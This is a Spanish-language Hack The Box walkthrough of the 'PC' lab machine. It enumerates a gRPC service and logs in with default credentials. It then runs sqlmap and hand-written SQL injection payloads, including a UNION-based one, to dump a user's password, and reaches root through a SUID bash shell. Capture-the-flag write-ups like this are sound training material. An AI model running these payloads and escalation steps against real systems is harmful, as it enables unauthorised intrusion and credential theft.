[Read on Englis](README.md)

# PC - WriteUp/Walkthrought [HTB]

## PWNED By 14Wual

[Github](https://github.com/14wual):  14wual <br>
[Twitter](https://twitter.com/14wual): 14wual <br>
[YouTube](https://youtube.com/@wual): @wual <br>
[Paǵina Web](https://14wual.github.com) <br>

## Acerca del Laboratorio

**Nivel**: Easy <br>
**Sistema Operativo**: Linux <br>
**Rating**: 4.5 <br>
**Release Date**: 21 Mayo <br>

## Recopilación

Empezamos usando NMAP para enocntrar los puertos abiertos.

Comando: `sudo nmap -sCV -T5 -sS -n 10.10.11.214 -oN nmap-basic.txt`. Output:

```
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como no nos dá mucha información vamos ha hacer un análisis completo de puertos: ` sudo nmap -p- -T5 -n 10.10.11.214 -oG nmap-p-.txt`. Output:

```
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

Vemos que tenemos otro puerto, un puerto unknown, el `50051`, si hacemos una pequeña búsqueda por internet, nos enteramos de que este es un puerto que comunmente se usa al servicio/protocolo **gRPC**. Asi que vamos ha instalar una herramienta para poder visualizar el puerto.

Para esta, necesitamos tener instalado **Go**, para ello hacemos lo siguiente:

```bash
sudo apt update
sudo apt install golang
```

Ahora debemos instalar la herramienta [grpcui](https://pkg.go.dev/github.com/fullstorydev/grpcui), asi que para ello, ejecutamos el siguiente comando en nuestra terminal:

```bash
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

Si esto nos reporta un error, como fué en mi caro, se puede hacer de otra forma. Primero debemos clonarmos el siguiente repositorio: [fullstorydev/grpcui](https://github.com/fullstorydev/grpcui), después realizar los siguientes commandos:

```bash
cd grpcui && make install
```

Si nos sigue dando error de compilación, hacemos lo siguiente:

```bash
cd grpcui && make updatedeps && make install
```

Por último, debemos exportar el path, para agregarlo a nuestro **rc**. Primero hacemos un `sudo find / -name grpcui`, nos deberá reportar varios outputs, pero el que nos interesa es algo parecido a este: `/home/<tu-usuario>/go/bin/grpcui`. Ahora deberemos abrir nuestro archivo rc, dependiendo de que shell estemos usando abriremos el `.zshrc` o el `.bashrc`. En mi caso es **zsh**. Con el comando `sudo nano .zshrc` abrimos el archivo, y al final del archivo escribimos lo siguiente: `export PATH=$PATH:/home/<tu-usuario>/go/bin` Siendo este path, el que hemos encontrado haciendo el `find`.

Al hacer estos sencillos pasos, nuestra terminal deberá reportarnos que el comando `grpcui` si **existe**.

Ahora deberemos hacer el siguiente comando, para ejecutar la aplicación y poder visualizar el puerto:

```
grpcui --plaintext 10.10.11.214:50051 
```

Al ejecutar este comando, nos abrirá una nueva pestaña en nuestro navegador algo tal que así:

![grpcui-web](images/grpcui-1.png)

En esta paǵina vemos varias cosas bastantes importantes, pero vamos a lo importante. En primer lugar nos encontramos con 2 desplegables: **Service name** & **Method name**. Si desplegamos el primero mencionado. Veremos que únicamente solo tenemos una acción. Pero si desplegabmos el segundo, parece que tenemos 3 funciones diferentes por descubrir: **LoginUser** & **RegisterUser** & **GetInfo**, nos ayudaremos de ellas en un futuro, pero ahora vamos ha centrarnos en el resto del contenido.

Hay un apartado llamado **Request Data**, *LoginUserRequest*, que nos permite realizar una solicitud de inicio de sesión. Asi que vamos ha probar con algunas contraseñas por defecto. Activamos los dos inputs, marcando los dos checkbox y escribimos:

```
username: username
password: password
```

Ahora vamos ha intentar iniciar sesión con esas credenciales, asi que al tener escrito estas dos strings, vamos ha pulsar `invoke`. La respuesta es la siguiente (en el apartado Response Data):

```
{
  "message": "Login unsuccessful"
}
```

Lo que nos dice que estas no son las credenciales, así que seguimos intentandolo, esta vez vamos ha intentarlo con lo siguiente:

```
username: admin
password: admin
```

Al invocarlo, nos reporta la siguiente información:

**Response Data**

```
{
  "message": "Your id is 333."
}
```

**Response Trailers**

	
| token | b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjI5NDZ96xtSkyx5xzDHf66woamHT2EGOpYzSYborktiz3P0Igg' |
|-------|--------------------------------------------------------------------------------------------------------------------------------------|

Como podemos ver, ya hemos conseguido las credenciales de administrador, estas son: `admin:admin`. Vemos que tenemos un id y un token. Asi que ahora vamos ha intentar sacar un poco más de información. 

Antes vimos que en el desplegable *Method name*, teniamos una opción llamada **GetInfo**, así que la vamos ha seleccionar.

Una vez más vamos a seleccionar la string que tenemos, esta vez para el campo ID, y vamos ha copiar nuestra id, en mi caso 333.

Al invocar, nos devuelve, el siguiente mensaje:

```
{
  "message": "Authorization Error.Missing 'token' header"
}
```

Nos falta el token, asi que volvemos al apartado **Request Form** y en la categoría: **Request Metadata**, vamos ha escribir lo siguiente:

```
Name: token
Value: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjI5NDZ96xtSkyx5xzDHf66woamHT2EGOpYzSYborktiz3P0Igg
```

Escribimos el valor, en forma de string, quitando el `b''`, para quitar la forma bytes. El output, es el siguiente:

```
{
  "message": "Will update soon."
}
```

![request-response-getInfo](images/request-response-getInfo.png)

Como ya cocemos, más o menos el funcionamiento de `grpcui`, nos vamos ha dirigir a `BurpSuite`, para ver si conseguimos un poco más de información. 

Como los tokens e ids son temporales, vamos ha conseguir otro, logeandonos con `admin:admin`. Y vamos ha volver a edir información de usuario, pero esta vez interceptando el tráfico. Vemos que se envía la siguiente información:

```
{
    "metadata":[
        {
            "name":"token",
            "value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjM5NjB9.5yJCFKAkt-trLMcwYeW2Xjbn9Oz71b7s0Gekj_xEqHo"
        }
    ],
    "data":[
        {
            "id":"537"
        }
    ]
}
```

![burpsuite-1](images/burpsuite-1.png)

Estando en este punto, vamos ha realizar **SQLi**. Aprovecharemos el campo ID, para esto. Emepezaremos intentando usar algunos payloads de [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Vamos ha tratar sacar la versión de la ddbb, haciendo peticiones sin inyectar:

```sql
Oracle SQL: "SELECT version FROM v$instance;",
PostgreSQL: "SELECT version()",
SQLite: "select sqlite_version();",
MySQL: "SELECT * FROM Table WHERE id = '!id';"
```

En todas, nos reporta lo siguiente:

```
Unknown (2)
Unexpected <class 'TypeError'>: bad argument type for built-in operation
```

![sqli-1](images/sqli-1.png)


Como, todas me han dado error, vamos ha hacer peticiones más sencillas, y esta vez sí, **SQLi**. Fuí probando sin resultado todas las siguientes:

```
SELECT sql FROM sqlite_schema
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

![sqli-2](images/sqli-2.png)

En este punto, vamos ha interceptar una vez más la petición, vamos ha guardarlo en un fichero txt y lo vamos ha pasar por `SQLMap`.

Para ello, vamos ha hacer click derecho, en todo el texto copiado, y lo copiamos a la opción `copy as curl command (bash)`. De manera que hacemos lo siguiente

```bash
curl ... >> output.txt
```

En mi caso es lo siguiente:

![petition-curl](images/petition-curl.png)

*(Se debe copiar la **petición**, **no** el **resultado**)*. 

![petition-curl-2](images/petition-curl-2.png)

Ahora realizaremos el siguiente comado: `sqlmap -r fichero.txt`. 

![sqlmap-1.png](images/sqlmap-1.png)

En mi caso ya ha descubierto que tenemos ante nosotros sqlite, y el output, nos lo ha guardado en el siguiente path: `'/home/<tu-usuario>/.local/share/sqlmap/output/127.0.0.1'`. Vamos ha ver, que nos ha reportado, en mi caso:

```
cd /home/wual/.local/share/sqlmap/output/127.0.0.1
ls >> log  session.sqlite  target.txt
```

Si hacemos un cat a nuestr target, nos deberá reportar un output parecido a este, pero con vuestros datos:

```
1   │ http://127.0.0.1:37019/invoke/SimpleApp.getInfo (POST)  # /usr/bin/sqlmap -r petition.txt
2   │ 
3   │ {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjY0NDJ9.-OvkPbdZYQYEyNAbZkThmYH5eMnBnB5u4XJ2rhmJ8KI"}],"data":[{"id":"555"}]}
```

Al hacer cat al log, me reporta que se han hecho un total de **193** de peticiones HTTP y que se ha identificado ddbbs SQLite. Ahora vamos ha programar un **pequeño script py básico** para leer completamente el archivo `session.sqlite`, el tercer archivo reportado por **sqlmap**.

Script Python:

```
import sqlite3
def read_session_sqlite(file_path):

    conn = sqlite3.connect(file_path)
    cursor = conn.cursor()

    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()

    for table in tables:
        table_name = table[0]
        print(f"Table: {table_name}\n-------------------------")

        cursor.execute(f"SELECT * FROM {table_name};")
        rows = cursor.fetchall()

        for row in rows:print(row)

    cursor.close()
    conn.close()

if __name__ == '__main__':
    sqlite_file = "<path-archivo-session.sqlite>"
    read_session_sqlite(sqlite_file)

```

Enlace del script python: [Script Python](scripts/session-sqlite.py)

![script-py](images/script-py.png)

Esta base de datos, si nos ha reportado bastante información aparentemente muy valiosa, si realizamos el siguiente comando, podremos ver el contenido de esta metiendolo en un archivo:

```
python3 session-sqlite.py >> session-sqlite.output
```

Este también, se puede ver aquí: [Enlace Output](scripts/output/session-sqlite.output). Abre el desplegable para ver el `output` que nos reporta el script:

<details>
  <summary>Output</summary>

    ```

    Table: storage
    -------------------------
    (1240019662489059, 'False')
    (572062615179750280, 'False')
    (804542772731992705, 'False')
    (1384206628068379451, 'False')
    (2283944405254295019, 'False')
    (2347901146056695925, 'gAKJLg==')
    (3068277119679010664, 'True')
    (3183297259884337133, 'False')
    (3317302315516816033, 'False')
    (3959875106548221468, 'False')
    (4281076238450381754, 'False')
    (4380207248260737285, 'False')
    (4655856319666804831, 'SQLite')
    (4714056397588486423, 'False')
    (4923402527400451348, 'False')
    (5105149081609890783, 'gAJdcQBjbGliLmNvcmUuZGF0YXR5cGUKSW5qZWN0aW9uRGljdApxASmBcQIoWAUAAABwbGFjZXEDWA0AAAAoY3VzdG9tKSBQT1NUcQRYCQAAAHBhcmFtZXRlcnEFWAcAAABKU09OIGlkcQZYBQAAAHB0eXBlcQdLAVgGAAAAcHJlZml4cQhYAAAAAHEJWAYAAABzdWZmaXhxCmgJWAYAAABjbGF1c2VxC11xDChLAUsISwllWAUAAABub3Rlc3ENXXEOWAQAAABkYXRhcQ9jbGliLmNvcmUuZGF0YXR5cGUKQXR0cmliRGljdApxECmBcREoSwFoECmBcRIoWAUAAAB0aXRsZXETWDAAAABBTkQgYm9vbGVhbi1iYXNlZCBibGluZCAtIFdIRVJFIG9yIEhBVklORyBjbGF1c2VxFFgHAAAAcGF5bG9hZHEVWM8AAAB7Im1ldGFkYXRhIjpbeyJuYW1lIjoidG9rZW4iLCJ2YWx1ZSI6ImV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVgybGtJam9pWVdSdGFXNGlMQ0psZUhBaU9qRTJPRFE1TWpZME5ESjkuLU92a1BiZFpZUVlFeU5BYlprVGhtWUg1ZU1uQm5CNXU0WEoycmhtSjhLSSJ9XSwiZGF0YSI6W3siaWQiOiI1NTUgQU5EIDkxNzY9OTE3NiJ9XX1xFlgFAAAAd2hlcmVxF0sBWAYAAAB2ZWN0b3JxGFgPAAAAQU5EIFtJTkZFUkVOQ0VdcRlYBwAAAGNvbW1lbnRxGmgJWA8AAAB0ZW1wbGF0ZVBheWxvYWRxG05YCgAAAG1hdGNoUmF0aW9xHEc/6++dsi0OVlgIAAAAdHJ1ZUNvZGVxHUvIWAkAAABmYWxzZUNvZGVxHkvIdX1xHyhYCQAAAGF0dHJpYnV0ZXEgTlgIAAAAa2V5Y2hlY2txIYhYGAAAAF9BdHRyaWJEaWN0X19pbml0aWFsaXNlZHEiiHViSwVoECmBcSMoaBNYLwAAAFNRTGl0ZSA+IDIuMCBBTkQgdGltZS1iYXNlZCBibGluZCAoaGVhdnkgcXVlcnkpcSRoFVgZAQAAeyJtZXRhZGF0YSI6W3sibmFtZSI6InRva2VuIiwidmFsdWUiOiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKMWMyVnlYMmxrSWpvaVlXUnRhVzRpTENKbGVIQWlPakUyT0RRNU1qWTBOREo5Li1PdmtQYmRaWVFZRXlOQWJaa1RobVlINWVNbkJuQjV1NFhKMnJobUo4S0kifV0sImRhdGEiOlt7ImlkIjoiNTU1IEFORCA2OTI4PUxJS0UoQ0hBUig2NSw2Niw2Nyw2OCw2OSw3MCw3MSksVVBQRVIoSEVYKFJBTkRPTUJMT0IoW1NMRUVQVElNRV0wMDAwMDAwMC8yKSkpKSJ9XX1xJWgXSwFoGFh/AAAAQU5EIFtSQU5ETlVNXT0oQ0FTRSBXSEVOIChbSU5GRVJFTkNFXSkgVEhFTiAoTElLRSgnQUJDREVGRycsVVBQRVIoSEVYKFJBTkRPTUJMT0IoW1NMRUVQVElNRV0wMDAwMDAwMC8yKSkpKSkgRUxTRSBbUkFORE5VTV0gRU5EKXEmaBpoCWgbTmgcRz/r752yLQ5WaB1LyGgeTnV9cScoaCBOaCGIaCKIdWJLBmgQKYFxKChoE1gsAAAAR2VuZXJpYyBVTklPTiBxdWVyeSAoTlVMTCkgLSAxIHRvIDIwIGNvbHVtbnNxKWgVWKABAAB7Im1ldGFkYXRhIjpbeyJuYW1lIjoidG9rZW4iLCJ2YWx1ZSI6ImV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVgybGtJam9pWVdSdGFXNGlMQ0psZUhBaU9qRTJPRFE1TWpZME5ESjkuLU92a1BiZFpZUVlFeU5BYlprVGhtWUg1ZU1uQm5CNXU0WEoycmhtSjhLSSJ9XSwiZGF0YSI6W3siaWQiOiItNzM5NCBVTklPTiBBTEwgU0VMRUNUIENIQVIoMTEzLDEyMCwxMDcsMTIyLDExMyl8fENIQVIoMTE3LDY3LDEyMCw4NywxMjEsMTEwLDc1LDEwNywxMDIsMTIwLDExOSw4NiwxMjIsNzYsODUsMTEwLDEyMCwxMDMsNzIsNjYsNzksNjcsNzEsODUsNzgsMTAxLDk3LDEyMCwxMTcsNzIsMTEwLDk3LDgxLDcyLDk4LDc2LDcwLDEwMyw4MCw2OSl8fENIQVIoMTEzLDEwNiwxMDYsMTIwLDExMyktLSBEc2VHIn1dfXEqaBdLAmgYKEsASwFYFQAAAFtHRU5FUklDX1NRTF9DT01NRU5UXXEraAloCVgEAAAATlVMTHEsSwKJTk5OdHEtaBpoK2gbTmgcRz/r752yLQ5WaB1OaB5OdX1xLihoIE5oIYhoIoh1YnV9cS8oaCBOaCGIaCKIdWJYBAAAAGNvbmZxMGgQKYFxMShYCAAAAHRleHRPbmx5cTJOWAYAAAB0aXRsZXNxM05YBAAAAGNvZGVxNE5YBgAAAHN0cmluZ3E1TlgJAAAAbm90U3RyaW5ncTZOWAYAAAByZWdleHBxN05YCAAAAG9wdGltaXplcThOdX1xOShoIE5oIYhoIoh1YlgEAAAAZGJtc3E6WAYAAABTUUxpdGVxO1gMAAAAZGJtc192ZXJzaW9ucTxdcT1YBQAAAD4gMi4wcT5hWAIAAABvc3E/TnV9cUAoaCBOaCGIaCKIdWJhLg==')
    (5122382082462906814, 'False')
    (5151284069082055767, 'False')
    (5493418307874951924, 'False')
    (5564929365057259332, 'gAJdcQAu')
    (6087146522498525056, 'gAJjX19idWlsdGluX18Kc2V0CnEAXXEBhXECUnEDLg==')
    (6291964657364147628, 'False')
    (6769609608952949097, 'False')
    (6942583506710494399, 'False')
    (7202527242063647457, 'gAJjbGliLmNvcmUuZGF0YXR5cGUKQXR0cmliRGljdApxACmBcQEoWAkAAABkZWxpbWl0ZXJxAlgGAAAAYnd0anJ6cQNYBQAAAHN0YXJ0cQRYBQAAAHF4a3pxcQVYBAAAAHN0b3BxBlgFAAAAcWpqeHFxB1gCAAAAYXRxCFgDAAAAcWJxcQlYBQAAAHNwYWNlcQpYAwAAAHF5cXELWAYAAABkb2xsYXJxDFgDAAAAcXBxcQ1YBQAAAGhhc2hfcQ5YAwAAAHF0cXEPdX1xEChYCQAAAGF0dHJpYnV0ZXERTlgIAAAAa2V5Y2hlY2txEohYGAAAAF9BdHRyaWJEaWN0X19pbml0aWFsaXNlZHETiHViLg==')
    (7247098384123015991, 'False')
    (7636301594824412900, 'False')
    (7666376395574666221, 'False')
    (7736642064423348026, 'False')
    (8325498930527189365, 'False')
    (8954585370297807119, 'False')

    ```
 
</details>

Como podemos ver, la tabla se llama **storage**, y nos reporta bastantes hash. Vamos a identificar el hash de la columna `7202527242063647457`, por ejemplo. Para ello, yo voy ha usar la página web [dcode](https://www.dcode.fr/cipher-identifier) su herramienta `cipher-identifier`. Si por algún motivo, no consigo ninguno retorno, usaré otras herramientas.

![dcode-cipher-identifier](images/dcode-cipher-identifier.png)

En un principio, nos ha reportado que este, es `base64`, vamos ha intentar descifralo.

![dcode-base64](images/dcode-base64.png)

Este es el reporte, como no es legible, usaré otras herramientas. El output de *dcode*:

```
��clib.core.datatype ...
```

Antes de seguir, vamos ha hacerlo con todos, aunque ya os hago spoiler, y es que esta herramienta, al igual que el resultado anterior, nos repotar mal el output. 

Por otro lado, entre todos los hashes, podemos ver, que la columna: `4655856319666804831`, nos reporta `SQLite` y la columna `5564929365057259332`, nos reporta `gAJdcQAu`, una string bastante pequeña, que podría llegar a ser un nombre de usuario.

Como de momento, pensamos que estan codificados en base64, vamos ha intentar decodificarlos usando terminal de la siguiente manera: `echo "<hash>" | base64 -d`. Antes de ello, guardaremos cada hash en un archivo diferente.

```bash
mkdir hashes-Base64 && cd hashes-Base64
touch hash-{1,2,3,4,5}.txt
```

Si hacemos `ls`, veremos que se han  creado los siguientes archivos: 

```
hash-1.txt  hash-2.txt  hash-3.txt  hash-4.txt  hash-5.txt
```

Ahora meteremos todos los hashes en los distintos archivos:

```
echo "hash" > hash-!num.txt
```

![hashes-file](images/hashes-file.png)

Y ahora sí, vamos ha realizar la decodificación de los hashes:


```
cat "<hash-file>" | base64 -d
```

Este es el resultado de todos, unas rows, con todas las peticiones que ha hecho sqlmap:

![decode-hashes.png](images/decode-hashes.png)

En este punto, voy ha probar de manera manual los diferentes payloads, por si, me reportan algo interesante:

```
Payload 1: "555 AND 9176=9176" | Output: Nada

Payload 2: "555 AND 6928=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB
(500000000/2))))" | Output: Nada

Payload 3: "-7394 UNION ALL SELECT CHAR(113,120,107,122,113)||CHAR(117,67,120,87,121,110,75,107,102,120,119,86,122,76,85,110,120,103,72,66,79,67,71,85,78,101,97,120,117,72,110,97,81,72,98,76,70,103,80,69)||CHAR(113,106,106,120,113)-- DseG" | Output: Sí
```

Este tercer Payload, me ha reportado el siguiente mensaje:

```
{
  "message": "qxkzquCxWynKkfxwVzLUnxgHBOCGUNeaxuHnaQHbLFgPEqjjxq"
}
```

# Explotación 

Por último vez, vamos ha ejecutar sqlmap, pero con el parámetro `--dump`, para ver si nos dumpea la base de datos al completo. Comando (recuerden que el id y el token, son temporales):

```
sqlmap -r petition.txt --dump
```

Esta vez, el output, si que sí, nos reporta información realmente buena, entre ella podemos resaltar lo siguiente:



```
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

Table: messages
[1 entry]
+----+-------------------+----------+
| id | message           | username |
+----+-------------------+----------+
| 31 | Will update soon. | admin    |
+----+-------------------+----------+
```

# Obtención

![sqlmap-2](images/sqlmap-2.png)

¡Por fín! Ya tenemos un nuevo usuario y su contraseña: `sau:HereIsYourPassWord1431`.

Vamos a probar a conectarnos por ssh, com el usuario sau: 

```
ssh sau@10.10.11.214
sau@10.10.11.214's password: HereIsYourPassWord1431
```

Si hacemos `ls`, obtenemos los siguientes archivos:

```
CVE-2021-4034-main  CVE-2021-4034-main.zip  lin.out  linpeas_base.sh  lse.sh  pspy64  snap  user.txt
```

Vamos ha hacer cat al `user.txt` para obtener la bandera: 4e15****************************

En este momento voy ha conectarme pir una terminal `qterm`, para que no se me bugue esta. Y ejecutaremos el `linpeas` por si nos reporta algún path sin contraseña root.

![linpeas-1](images/linpeas-1.png)

# Mantenimiento

Al ejecutar el linpeas, me he dado cuenta que había un path en el que podía entrar y ejecutar `bash` con el **flag** `-p`.

![linpeas-2](images/linpeas-2.png)

Así que ejecutaremos los siguietes comandos:

```
/usr/bin/bash -p 
id && whoami
cat /root/root.txt
```

Y de esta manera obtendremos el control de la máquina y su flag.